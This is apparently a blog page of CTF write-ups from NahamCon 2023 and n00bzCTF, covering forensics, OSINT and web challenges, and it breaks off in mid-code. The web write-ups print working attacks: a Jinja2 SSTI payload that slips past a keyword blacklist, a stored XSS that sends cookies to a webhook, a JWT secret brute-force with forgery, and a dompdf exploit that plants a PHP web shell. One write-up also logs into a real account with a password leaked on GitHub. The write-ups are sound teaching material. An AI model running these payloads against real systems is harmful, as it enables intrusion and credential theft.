user@zombie:/proc/11/fd$ ls -al total 0 dr-x------ 2 user user 0 Jun 15 22:42 . dr-xr-xr-x 9 user user 0 Jun 15 22:41 .. lr-x------ 1 user user 64 Jun 15 22:43 0 -\u0026gt; /dev/null l-wx------ 1 user user 64 Jun 15 22:43 1 -\u0026gt; /dev/null l-wx------ 1 user user 64 Jun 15 22:43 2 -\u0026gt; /dev/null lr-x------ 1 user user 64 Jun 15 22:43 3 -\u0026gt; /home/user/flag.txt (deleted) While we do see that it notes flag.txt is deleted. However, perhaps we can still see something, since the program is still in running memory?\n1 2 user@zombie:/proc/11/fd$ cat 3 flag{6387e800943b0b468c2622ff858bf744} And the flag is here. Clearly a simple rm might not be enough to exterminate the file out of existence. However, this situation is probably a little unusual since the tail -f was still running long after the rm command.\nflag{6387e800943b0b468c2622ff858bf744}\nOSINT Chall1 Author: @Gary#4657\nHead over to https://osint.golf and select chall1 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nFirst challenge places us on a golf course, at some kind of ceremony/speech. The first object of interest is the large event banner, containing the phrase \u0026ldquo;all Thailand Premier Championship\u0026rdquo;. There is more text, Road to (something), that I was unable to accurately read.\nSearching for all Thailand, we quickly see a webpage for a golf tour org. It seems like the right track. One common word that I found appearing was Singha, which might be matching in our image\u0026rsquo;s banner: \u0026ldquo;Road to Singha (something)\u0026rdquo;. The final word was still not readable for me, but this is enough to go on. Searching the golf tour website, I found all Thailand Premier Championship - Road to Singha Masters located on the media page. Following the link takes us to a video, and right away in the video we are given a location\u0026ndash;Singha Park in Khon Kaen.\nI found the tolerance to be rather strict, so I ended up locating the same exact capture on Google Maps as well.\nFinally with the pinpointed location, we get the flag.\nflag{3e3d01a002db29fec2a5e10ec758b852}\nChall2 Author: @Gary#4657\nHead over to https://osint.golf and select chall2 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nNOTE: The integrated compass direction is inconsistent with the actual panorama representation.\nThe second challenge places us on a large boat near a dock, with vehicles on it. Unfortunately, boats very commonly travel internationally, so things such as language/flags on the boat may not give us interesting information. The land appears to have some unusual architecture, so I decided to screencap this region and see what a google image search can give me.\nVery quickly I find a very similar capture, labeling it Napoleon\u0026rsquo;s Elba Hideaway. The article notes that this location is in Portoferraio, Italy.\nOnce again, the pointing at the dock itself is not specific enough. After a bit more trial and error, I find the exact location:\nflag{e54fcc18854f0adfdedf22120c346b3a}\nChall3 Author: @Gary#4657\nHead over to https://osint.golf and select chall3 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nWe are now in a park. Notably, there are large buildings on all sides of the park. We must be in not only a major city, but a city with a sizeable space dedicated to a grassy open park. My first inclination is New York City with its quite sizeable Central Park. Checking the terrain map, the Sheep Meadow location is a wide grassy area. I look for a street view and know right away that this is a match. From chall3:\nFrom Sheep Meadow street view:\nOnce again, finding the same view location as the challenge:\nflag{aa1b04ee3ded3a7c3ee16be1ff85e99c}\nChall4 Author: @Gary#4657\nHead over to https://osint.golf and select chall4 under the NahamCon2023 category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!\nNOTE: The integrated compass direction is inconsistent with the actual panorama representation.\nIn the final Geosint challenge, we are given a drone shot of what seems to be a suburban area setting. We are too far away do identify anything such as the language on signs or country flags, but we can note the very large number of train track lanes. Some buildings in the distance appear to have uncommon architecture, but not enough for me to draw any conclusions. My first guess is to take the most eye-catching building and see what image searches can do for me.\nFrom this image, it was quickly identified as Bratislava Castle of Bratislava, Slovakia. This location does not match geographically, but the building\u0026rsquo;s design and colors match very well. The second building I searched for is the neighboring church-like building.\nThere were several identical matches for seemingly different buildings. However, one in particular mentions a castle with it in combination. this web posting seems to be reviewing it as a bike trail. Examining the geography in a google map search for Schloss Ebenfurth, it instantly became clear that this is the same location as the challenge.\nI was unable to find the same capture on Google Maps, but since this is an arial view, we can get a pretty good idea where it might be without too much trouble.\nflag{2e57cfe16d7e1c5431aa3b99d0e713cb}\nWeb Hidden Figures Author: @JohnHammond#6971\nLook at this fan page I made for the Hidden Figures movie and website! Not everything is what it seems!\nEntering the website we see a pretty well-constructed page promoting Hidden Figures, a pretty popular book/movie. None of the links take us to other pages, so there is little to be explored. Early on, I noticed that folder directory /assets/ is free to view. I thought perhaps there might be something hidden here, or in another commonly used folder type?\nAfter some lengthy enumeration, I found nothing of interest.\nLooking at the page source, I noticed that there are several links with very long url codes:\n1 2 data:image/png;base64,/9j/4AAQSkZJRgABAQEBLAEsAAD/7RqcUGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAFocAVoAAxslRxwCAAACAAAcAngAFVdvbWFuIG9mIE5BU0EgTGFuZ2xleRwCVQAPRGF2aWQgQy4gQm93bWFuHAI3AAgyMDE0MDMyMBwCPAALMDkxNTA2KzAwMDA4QklNBCUAAAAAABBbRWm4H1TKYVo1ObYsy6/POEJJTQQ6AAAAAAESAAAAEAAAAAEAAAAAAAtwcmludE91dHB1dAAAAAUAAAAAUHN0U2Jvb2wBAAAAAEludGVlbnVtAAAAAEludGUAAAAASW1nIAAAAA9wcmludFNpeHRlZW5CaXRib29sAAAAAAtwcmludGVyTmFtZVRFWFQAAAAWAEUAUABTAE8ATgAgAFMAdAB5AGwAdQBzACAAUAByAG8AIAA3ADkAMAAwAAAAAAAPcHJpbnRQcm9vZlNldHVwT2JqYwAAAAwAUAByAG8AbwBmACAAUwBlAHQAdQBwAAAAAAAKcHJvb2ZTZXR1cAAAAAEAAAAAQmx0bmVudW0AAAAMYnVpbHRpblByb29mAAAADHByb29mTW9uaXRvcjhCSU0EOwAAAAACLQAAABAAAAABAAAAAAAScHJpbnRPdXRwdXRPcHRpb25zAAAAFwAAAABDcHRuYm9vbAAAAAAAQ2xicmJvb2wAAAAAAFJnc01ib29sAAAAAABDcm5DYm9vbAAAAAAAQ250Q2Jvb2wAAAAAAExibHNib29sAAAAAABOZ3R2Ym9vbAAAAAAARW1sRGJvb2wAAAAAAEludHJib29sAAAAAABCY2tnT2JqYwAAAAEAAAAAAABSR0JDAAAAAwAAAABSZCAgZG91YkBv4AAAAAAAAAAAAEdybiBkb3ViQG/gAAAAAAAAAAAAQmwgIGRvdWJAb+AAAAAAAAAAAA \u0026lt;...SNIP...\u0026gt; And so on. I didn\u0026rsquo;t know this was possible or ever really done, but it appears that some websites might provide their images in base64 encoded data like this so that images can be loaded without retrieving data from other pages. This seems to be what is going on here, as following the link takes me to an image regardless of the website\u0026rsquo;s running state.\nEventually I thought to download each of the images located on the website. While reviewing this challenge I discovered that saving the image directly is enough, but at the time I had decided to copy/paste the entire url into a file. After removing data:image/png;base64, I base64 decoded the info:\n1 $ cat url | base64 -d \u0026gt; decode_url And so on, for all 4 images found.\nChecking exiftool didn\u0026rsquo;t give me any critical information, however binwalk did show me something hidden in the figures.\n1 2 3 4 5 6 7 $ binwalk decode_url2 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 15486 0x3C7E PNG image, 1851 x 174, 8-bit/color RGB, non-interlaced 15527 0x3CA7 Zlib compressed data, default compression There is another image hidden here, and potentially some compressed data? Extracting with binwalk:\n1 2 3 4 5 6 7 $ binwalk -D=\u0026#34;.*\u0026#34; decode_url2 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.01 15486 0x3C7E PNG image, 1851 x 174, 8-bit/color RGB, non-interlaced 15527 0x3CA7 Zlib compressed data, default compression Viewing the hidden PNG image:\nflag{e62630124508ddb3952843f183843343}\nMarmalade 5 Author: @congon4tor#2334\nEnjoy some of our delicious home made marmalade!\nWe are prompted to choose a username to log in. No password asked. Firstly trying admin, of course we are not allowed. So I go with my old friend asdf.\nOn login, it tells us that only admin can see the flag:\nWith how little content is on these pages, there is pretty much nothing else to consider other than editing the given cookie: token=eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ.SKkdg9_2EbXj67FcZNnXIg Based on the cookie having 3 sections separated by dots, I immediately recognize this as a JWT. Using jwt.io to decode:\nThe blue segment is a signature hashed with a secret key to prevent forgery, but this is not always used to verify. Perhaps we can just edit the Payload section so that our username is admin?\n1 2 3 { \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34; } Converting back to base64, our new token looks like this eyJhbGciOiJNRDVfSE1BQyJ9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.SKkdg9_2EbXj67FcZNnXIg\nWhen I edit the cookie, it gives me an interesting new error:\n1 2 3 # Bad Request Invalid signature, we only accept tokens signed with our MD5_HMAC algorithm using the secret fsrwjcfszeg***** So while they are checking the token signatures, they did a bit of an oopsie and gave away most of their secret key!! Only the last 5 characters are hidden, making this secret key effectively 5 characters in length. This is something that can be brute-forced rather easily.\nI used python to quickly generate a wordlist containing the known secret string, then appended all possible 5 letter combinations:\n1 2 3 4 5 6 7 8 9 10 fp = open(\u0026#34;wordlist.txt\u0026#34;, \u0026#34;w\u0026#34;) for i in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): for j in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): for k in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): for l in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): for m in range(ord(\u0026#39;a\u0026#39;), ord(\u0026#39;z\u0026#39;) + 1): fp.write(\u0026#39;fsrwjcfszeg\u0026#39; + chr(i) + chr(j) + chr(k) + chr(l) + chr(m) + \u0026#34;\\n\u0026#34;); fp.close() From this point, I can use my previously valid JWT for asdf, and use John the Ripper to brute force the secret key. John will accept the token when the signature is presented in hex, however I had trouble converting myself for some reason. This issue was resolved once I used Sjord\u0026rsquo;s jwtcrack code to recreate my token.\n1 2 $ python convert.py \u0026#39;eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ.SKkdg9_2EbXj67FcZNnXIg\u0026#39; eyJhbGciOiJNRDVfSE1BQyJ9.eyJ1c2VybmFtZSI6ImFzZGYifQ#48a91d83dff611b5e3ebb15c64d9d722 Cracking the secret with john:\n1 2 3 4 5 6 7 8 9 10 $ john jwt.txt --wordlist=wordlist.txt --format=HMAC-MD5 Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-MD5 [password is key, MD5 256/256 AVX2 8x3]) Warning: poor OpenMP scalability for this hash type, consider --fork=2 Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status fsrwjcfszegvsyfa (?) 1g 0:00:00:04 DONE (2023-06-16 13:39) 0.2487g/s 2472Kp/s 2472Kc/s 2472KC/s fsrwjcfszegvsxlg..fsrwjcfszegvtppv Use the \u0026#34;--show --format=HMAC-MD5\u0026#34; options to display all of the cracked passwords reliably Session completed. The secret key is fsrwjcfszegvsyfa Now to generate a valid signature for our forged jwt. Using the first 2 base64 encoded segments, we perform HMAC-MD5 hashing, then convert from hex back to base64:\nFinalized token:\n1 eyJhbGciOiJNRDVfSE1BQyJ9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.kpCxx3dVioNEfybFE2UBxg Upon refreshing the page, we get the flag.\nflag{a249dff54655158c25ddd3584e295c3b}\nObligatory Author: @congon4tor#2334\nEvery Capture the Flag competition has to have an obligatory to-do list application, right???\nFirstly, we are greeted with a sign-in page\nTypical admin:admin guesses do not work, so after making a new account\nI created a new task asdf, and this is the result. After exploring the POST parameters done during submission, as well as how things are altered when tasks are moved between active and completed, I did not see any interesting pattern. The most notable piece is that trashing my first task leads to http://challenge.nahamcon.com:32053/delete?id=2. However, id=1 appears inaccessible.\nWhen I turned my attention to the greentext, I noticed in the url we see this as well: http://challenge.nahamcon.com:32053/?success=Task%20created Editing the success= component will affect what is being displayed in green. After playing for a bit, I noticed that this is actually vulnerable to SSTI: http://challenge.nahamcon.com:32053/?success={{7*7}}\nDoing actions such as curl -v did not give any insight on the framework being used, but exploring the SSTI a little further gave me the impression that this is likely Jinja2: `http://challenge.nahamcon.com:32053/?success={{7*\u0026lsquo;7\u0026rsquo;}}``\nKnowing this, I tried some simple enumerations before I find the true difficulty of this challenge: http://challenge.nahamcon.com:32053/?success={{config}}\n1 2 HACKER DETECTED!!!! The folowing are not allowed: [ {{\\s*config\\s*}},.*class.*,.*mro.*,.*import.*,.*builtins.*,.*popen.*,.*system.*,.*eval.*,.*exec.*,.*\\..*,.*\\[.*,.*\\].*,.*\\_\\_.* ] It wasn\u0026rsquo;t obvious to me at first, but the real trouble is that any command containing a dot, or square brackets, is blocked. After spending a good amount of time looking for ways to bypass the filter, I eventually ran into this post. Importantly, the writer manages to create a payload to bypass \u0026ldquo;.\u0026rdquo;,\u0026quot;_\u0026quot;, \u0026ldquo;[]\u0026rdquo;, and even \u0026ldquo;|join\u0026rdquo;.\n1 {{request|attr(\u0026#39;application\u0026#39;)|attr(\u0026#39;\\x5f\\x5fglobals\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fbuiltins\\x5f\\x5f\u0026#39;)|attr(\u0026#39;\\x5f\\x5fgetitem\\x5f\\x5f\u0026#39;)(\u0026#39;\\x5f\\x5fimport\\x5f\\x5f\u0026#39;)(\u0026#39;os\u0026#39;)|attr(\u0026#39;popen\u0026#39;)(\u0026#39;id\u0026#39;)|attr(\u0026#39;read\u0026#39;)()}} Our blacklist also includes some functions that were used, which I bypassed by breaking between quotes (popen -\u0026gt; po\u0026rsquo;\u0026lsquo;pen).\n1 http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\\x5f\\x5fglobals\\x5f\\x5f%27)|attr(%27\\x5f\\x5fgetitem\\x5f\\x5f%27)(%27\\x5f\\x5fbuil%27%27tins\\x5f\\x5f%27)|attr(%27\\x5f\\x5fgetitem\\x5f\\x5f%27)(%27\\x5f\\x5fimp%27%27ort\\x5f\\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27id%27)|attr(%27read%27)()}} We have successful code execution!! Now all that remains is to find the flag.\nAfter some enumeration of where the flag might be, I began to think that perhaps there isn\u0026rsquo;t a flag.txt file after all. When I check the contents of the cwd:\n1 2 3 4 5 6 7 8 drwxr-xr-x 1 root root 4096 Jun 14 17:54 . drwxr-xr-x 1 root root 4096 Jun 14 17:54 .. drwxr-xr-x 1 uwsgi uwsgi 4096 Jun 16 20:55 DB -rw-r--r-- 1 root root 159 Jun 14 17:53 app.ini -rwxr-xr-x 1 root root 6693 Jun 14 17:53 app.py -rw-r--r-- 1 root root 792 Jun 14 17:53 models.py -rw-r--r-- 1 root root 138 Jun 14 17:53 requirements.txt drwxr-xr-x 2 root root 4096 Jun 14 17:53 templates I notice the DB folder, and I recall that my task id\u0026rsquo;s started at 2. Perhaps the flag is in admin\u0026rsquo;s task list, for id number 1?\nLooking inside the DB folder:\n1 2 3 drwxr-xr-x 1 uwsgi uwsgi 4096 Jun 16 20:55 . drwxr-xr-x 1 root root 4096 Jun 14 17:54 .. -rw-r--r-- 1 uwsgi uwsgi 16384 Jun 16 20:55 db.sqlite Unfortunately, opening a sqlite file is a bit tricky with the RCE that I am currently using. Moreover, dots are still blacklisted. It is fortunate that this folder only has one file, so we can use wildcard * to select db.sqlite without using dot. When I try cat /usr/src/app/DB/*:\nIt seems there are issues when trying to output invalid characters, causing the internal server error. As a last attempt, I decided to try strings, which should only output legitimate utf-8 friendly characters. However, it is not guaranteed that the flag could remain intact for this.\nRequest:\n1 view-source:http://challenge.nahamcon.com:32053/?success={{request|attr(%27application%27)|attr(%27\\x5f\\x5fglobals\\x5f\\x5f%27)|attr(%27\\x5f\\x5fgetitem\\x5f\\x5f%27)(%27\\x5f\\x5fbuil%27%27tins\\x5f\\x5f%27)|attr(%27\\x5f\\x5fgetitem\\x5f\\x5f%27)(%27\\x5f\\x5fimp%27%27ort\\x5f\\x5f%27)(%27os%27)|attr(%27po%27%27pen%27)(%27strings%20/usr/src/app/DB/db*%27)|attr(%27read%27)()}} Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 tabletasktask CREATE TABLE task ( id INTEGER NOT NULL, name VARCHAR(100), completed BOOLEAN, user_id INTEGER, PRIMARY KEY (id), CHECK (completed IN (0, 1)), FOREIGN KEY(user_id) REFERENCES user (id) tableuseruser CREATE TABLE user ( id INTEGER NOT NULL, username VARCHAR(40), password VARCHAR(50), PRIMARY KEY (id), UNIQUE (username) indexsqlite_autoindex_user_1user asdfasdf -adminT2dUL6Z#S9KH%x%i asdf admin asdf flag{7b5b91c60796488148ddf3b227735979} Very foturnately, the flag not only survived but is very readable! flag{7b5b91c60796488148ddf3b227735979}\nAs a side note, we have the password for admin now too, and can log in. admin:T2dUL6Z#S9KH%x%i\nStar Wars Author: @congon4tor#2334\nIf you love Star Wars as much as I do you need to check out this blog!\nFirstly comes logging in. After trying and failing a few easy guesses like admin:admin, I made my own account with username asdf. Upon entering we are led to a blog post:\nWe see a comment section and not much else, so of course we have to check for XSS\n1 \u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;);\u0026lt;/script\u0026gt; Our XSS was a hit, but also we can see notice that an admin should review our comment. This setup seems prime for a cookie hijack through XSS. I will use webhook.site to receive the cookie request.\n1 2 3 \u0026lt;script\u0026gt; document.write(``\u0026#39;\u0026lt;img src=\u0026#34;https://webhook.site/538e246b-2888-428c-b201-75331cefc008?c=\u0026#39;``+document.cookie+``\u0026#39;\u0026#34; /\u0026gt;\u0026#39;``); \u0026lt;/script\u0026gt; This XSS generates an image pointing to my webhook.site link, and adds the user\u0026rsquo;s document.cookie to the end of the url. And so, when a victim views this page, the image will attempt to be loaded by visiting my webhook. The webhook will log the request information and with it, I will be able to see whatever cookies are associated with the victim\u0026rsquo;s session.\nIndeed we see a cookie: x-wing=eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIvRmQ.20AcIM9F-Kg8q21j8Pc4mVl2aO0\nBy substituting our X-wing cookie for this one, we become admin. Revisiting the page, nothing has changed. After a quick directory enumeration, we can find a new page by visiting /admin. This is pretty guessable, although I do concede to running feroxbuster to point it out to me:\n1 2 3 4 feroxbuster -u http://challenge.nahamcon.com:30413/ \u0026lt;...SNIP...\u0026gt; 02 GET 4l 28w 303c http://challenge.nahamcon.com:30413/admin \u0026lt;...SNIP...\u0026gt; When visiting /admin while having the token, we can find the flag.\nflag{a538c88890d45a382e44dfd00296a99b}\nStickers Wooohoo!!! Stickers!!! Hackers love STICKERS!! You can make your own with our new website! Find the flag file in /flag.txt at the root of the filesystem.\nVisiting the website, there is a form to fill out custom information. Upon submitting data, we are generated a pdf webpage:\nIn particular I notice the url of the page corresponds to the data I submitted:\n1 http://challenge.nahamcon.com:31182/quote.php?organisation=\u0026amp;email=\u0026amp;small=0\u0026amp;medium=0\u0026amp;large=0 I downloaded the pdf file and decided to see if I can glean some information on how it was generated:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ exiftool quote.pdf ExifTool Version Number : 12.57 File Name : quote.pdf Directory : . File Size : 2.5 kB File Modification Date/Time : 2023:06:16 15:15:27-04:00 File Access Date/Time : 2023:06:16 15:15:27-04:00 File Inode Change Date/Time : 2023:06:16 15:15:27-04:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.7 Linearized : No Page Count : 1 Producer : dompdf 1.2.0 + CPDF Create Date : 2023:06:16 19:14:20+00:00 Modify Date : 2023:06:16 19:14:20+00:00 Title : Quote Immediately the producer dompdf stands out to me. I recognize a pretty serious vulnerability it that can lead to remote code execution CVE-2022-28368.\nI used this poc post to exploit this.\nUsing my own ngrok website, I direct the payload toward myself, where it can pick up the malicious php:\n1 challenge.nahamcon.com:31182/quote.php?organisation=\u0026lt;link rel=stylesheet href=\u0026#39;https://91cf-50-81-86-237.ngrok-free.app/exploit.css\u0026#39;\u0026gt;\u0026amp;email=\u0026amp;small=0\u0026amp;medium=0\u0026amp;large=0 In the exploit_font.php, I used a simple webshell one-liner:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ cat exploit_font.php � dum1�cmap `�,glyf5sc��head�Q6�6hhea��($hmtxD loca Tmaxp\\ nameD�|8dum2� -��-���� :83#5:08��_\u0026lt;� @�8�\u0026amp;۽ :8L�� :D 6 s \u0026lt;?php if(isset($_REQUEST[\u0026#39;cmd\u0026#39;])){ echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; $cmd = ($_REQUEST[\u0026#39;cmd\u0026#39;]); system($cmd); echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; die; }?\u0026gt; The unreadable junk above seems to be related to the file being intended as a font style, so it was left unchanged.\nAfter the request is sent, I see two GET requests on my server, knowing that it was successfully retrieved:\n1 2 3 4 5 HTTP Requests ------------- GET /exploit_font.php 200 OK GET /exploit.css 200 OK Now we need to determine the new name of the malicious php downloaded. While not thoroughly explained in the POC github, it appears that the name is based on the md5sum of the download link, in this case my ngrok link:\n1 2 $ echo -ne \u0026#34;https://91cf-50-81-86-237.ngrok-free.app/exploit_font.php\u0026#34; | md5sum 88045a0e7631a2540434bb8c27d7d483 - Now we visit the downloaded link under the format /dompdf/lib/fonts/\u0026lt;font-family\u0026gt;_\u0026lt;style\u0026gt;_\u0026lt;md5(url)\u0026gt;.php\n1 challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=id 1 2 3 � dum1�cmap`�,glyf5sc��head�Q6�6hhea��($hmtxD Lloca Tmaxp\\ nameD�|8dum2� -��-���� :83#5:08��_\u0026lt;�@�8�\u0026amp;۽ :8L�� :D 6 s uid=33(www-data) gid=33(www-data) groups=33(www-data) We do indeed see that it works! We were told the flag is located in root of the filesystem:\n1 challenge.nahamcon.com:31182/dompdf/lib/fonts/exploitfont_normal_88045a0e7631a2540434bb8c27d7d483.php?cmd=cat /flag.txt flag{a4d52beabcfdeb6ba79fc08709bb5508}\n","date":"2023-06-18T20:41:32-05:00","permalink":"https://yuwenmichael.netlify.app/post/nahamconctf_2023/","title":"NahamConCTF_2023"},{"content":"Misc Amazing Song Lyrics This is a wierd png file. I hope you can make some sense out of it!\nNote: Wrap the flag in n00bz{} and flag is all lowercase Author: NoobMaster The image is a pictogram for certain sign languages, but what language? I am no expert in sign language so I begin with random google searching. A brief search for American Sign Language alphabet gives me hand shapes that look similar:\nDecoding the message based on the hand shapes shown in this chart we get the following:\n1 2 3 4 5 AMERIC ANSIGN LANGUA GEDECO DED rephrased: American sign language decoded.\nn00bz{americansignlanguagedecoded}\nGoogle Form 1 Binary Flag Checkers are old, so how about some Google Forms Flag Checker? Link Author: NoobMaster\nVisiting the site we are met with a Google form:\nRandom guesses yield no results. However when we check source code, we can search for the ctf flag format n00bz using find. Within the source code we discover the flag: n00bz{1n5p3ct_3l3m3n7_ftw!}\nMy Chemical Romance My friend loves Chemistry very much specially the elements. Once I asked him the wifi password he gave me some numbers like 186808155710 and told me that the number are in group of two like 1008 -\u0026gt; 10 and 08/8. Can you help to gather the wifi password? (Note: It forms a complete word, so you might have to leave out something).\nFlag format: n00bz{the_password_in_lower_case} Author: noob_abhinav\nBased on the description, this password is likely linked to periodic table elements. We are also told that the password represents a real word, so the element letters might not exactly translate to the answer.\nFrom 186808155710 we can separate into elements: 18 68 08 15 57 10 Using periodic table, element letters are as follows: ar er o p la ne indeed areroplane doesn\u0026rsquo;t work, however this looks similar to the word aeroplane. Trying this as the flag works. n00bz{aeroplane}\nOSINT Mission Moon A mission, had planned to land on the moon. Can you find where it planned to land on the moon and the name of the lander and rover? Flag is latitude longitude upto one decimal place.\nNote: Flag format - n00bz{Lander_Rover_latitude_longitude} for eg - n00bz{Examplelander_Examplerover_12.3_45.6}. Also note that flag is case sensitive! Note: Due to a quite big range of answers, to narrow down your search, use the latitude and longitude provided from this site: blog.jatan.space This presented image appears to be a 3D rendering of a moon landing plan. The first easy check to be done is a reverse image search in google, and see what articles are discussing this event. Very quickly I see an article that uses the image discussing a failed landing for India\u0026rsquo;s moon mission titled Chandrayaan 2. The lander for this mission appears to be called Vikram, and the rover called Pragyan. This info is part of the flag, but we still need to find the exact coordinates of the planned landing. With a mission name in mind, I visited the blog.jatan.space site mentioned, and searched for Chandrayaan 2. On this page I learned the coordinates planned for the landing: 70.9S, 22.8E.\nNow we can construct and submit the flag as n00bz{Vikram_Pragyan_70.9_22.8}.\nTry to hack me My friend brayannoob gave me a ctf challenge and told me Try to hack me.\nA google search on brayannoob did not yield any interesting results, so I decided to switch search engines. Upon using Bing, a github account was among the first results, very interesting. The repositories within this github we see a n00bzCTF-2022 writeup. With relevance on our side, this is clearly related to the challenge. Exploring the newest repository, BrayanResearch, I uncovered user credentials from an older edit of the README.md file:\n1 2 3 4 \u0026lt;!-- ACCOUNT CREDENTIALS --\u0026gt;| \u0026lt;!-- USERNAME - @brayanduarte.noob --\u0026gt;| \u0026lt;!-- PASSWORD - Brayann00b@2023 --\u0026gt; # THANK YOU :love: Other edits also give light to potential usernames:\n1 \u0026lt;!-- username : @brayan24 --\u0026gt; and in the current readme:\n1 \u0026lt;!-- username : brayan234 --\u0026gt; We have potential usernames and a password, but which service these are for? It is not so clear.\nThis github repo supplies a demo, providing a link to replit.com. After searching for a little bit, we come across this user.. Using the provided password, I was able to log in and \u0026ldquo;hack\u0026rdquo; this account! However, after searching for quite some time, I was unable to find the flag. Reviewing the CTF discord channel, there is an announcement that breaching this account was unintended for the challenge. I suppose this little adventure may serve to emphasize how easy it might be to accidentally leak credentials on github or other services!\nFrom the discord message we know the password login is irrelevant, time to think on the hints provided in the prompt again. Looking at the Try to hack me part, it makes me think of the popular web service TryHackMe. After looking through usernames we stumble upon a certain username from our list: brayan234. Looking at this account, it appears we didn\u0026rsquo;t need to log in at all! The flag is presented right in the user info section. n00bz{y0u_p4ss3d_th3_ch4ll3ng3_c0ngr4tul4t10ns_7c48179d2b7547938409152641cf8e}\nWeb Club_N00b Can you get in the club? Author: 0xBlue\nhttp://challs.n00bzunit3d.xyz:8080/\nFollowing the link:\nOnly \u0026ldquo;radical\u0026rdquo; hackers are allowed, and we are not. Upon checking status, we see the button is not post/cookie data related, but instead redirects to an interesting url:\n1 http://challs.n00bzunit3d.xyz:8080/check?secret_phrase=nope We are not on the member list. But perhaps if we change the secret_phrase? After a couple guesses, we successfully get in with secret_phrase=radical.\nn00bz{see_you_in_the_club_acting_real_nice}\nSecret Group To get the flag, you must be a member of the secret group! Author: NoobMaster\nhttp://challs.n00bzunit3d.xyz:31401/\nVisiting the url, we see the following in plain text:\n1 Not an agent of the **n00bz-4dm1n** secure browser! My first thought is that it is asking for a change to the http header User-Agent. Doing so using curl:\n1 2 curl -H \u0026#34;User-Agent: n00bz-4dm1n\u0026#34; http://challs.n00bzunit3d.xyz:31401/ \u0026lt;p\u0026gt;Does not Accept \u0026lt;b\u0026gt;fl4g\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt; It looks to be another edit to http headers:\n1 2 curl -H \u0026#34;User-Agent: n00bz-4dm1n\u0026#34; -H \u0026#34;Accept: fl4g\u0026#34; http://challs.n00bzunit3d.xyz:31401/ \u0026lt;p\u0026gt;Connection not \u0026lt;b\u0026gt;s3cur3\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt; Again keeping with the trend, I add another header line for connection:\n1 2 curl -H \u0026#34;User-Agent: n00bz-4dm1n\u0026#34; -H \u0026#34;Accept: fl4g\u0026#34; -H \u0026#34;Connection: s3cur3\u0026#34; http://challs.n00bzunit3d.xyz:31401/ \u0026lt;p\u0026gt;Not refered by \u0026lt;b\u0026gt;s3cr3t.n00bz-4dm1n.xyz\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt; Time to add referer tag:\n1 2 curl -H \u0026#34;User-Agent: n00bz-4dm1n\u0026#34; -H \u0026#34;Accept: fl4g\u0026#34; -H \u0026#34;Connection: s3cur3\u0026#34; -H \u0026#34;Referer: s3cr3t.n00bz-4dm1n.xyz\u0026#34; http://challs.n00bzunit3d.xyz:31401/ \u0026lt;b\u0026gt;Give-Flag\u0026lt;/b\u0026gt; is not \u0026lt;b\u0026gt;7ru3\u0026lt;/b\u0026gt; Give-Flag is not really a common http header, but based on what has been going on, it\u0026rsquo;s the first thing we should try.\n1 2 $ curl -H \u0026#34;User-Agent: n00bz-4dm1n\u0026#34; -H \u0026#34;Accept: fl4g\u0026#34; -H \u0026#34;Connection: s3cur3\u0026#34; -H \u0026#34;Referer: s3cr3t.n00bz-4dm1n.xyz\u0026#34; -H \u0026#34;Give-Flag: 7ru3\u0026#34; http://challs.n00bzunit3d.xyz:31401/ n00bz{y0u_4r3_n0w_4_v4l1d_m3mb3r_0f_th3_s3cr3t_gr0up!} Finally we get the flag. n00bz{y0u_4r3_n0w_4_v4l1d_m3mb3r_0f_th3_s3cr3t_gr0up!}\nCaas Curl as a Service is old, welcome to Certificate as a Service! Note: flag is in flag.txt Author: NoobMaster\nI was not able to solve this on my own, but thanks to onsra03 for the fantastic writeup post-CTF.\nSource code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #!/usr/bin/env python3 from flask import Flask, request, render_template, render_template_string, redirect import subprocess import urllib app = Flask(__name__) def blacklist(inp): blacklist = 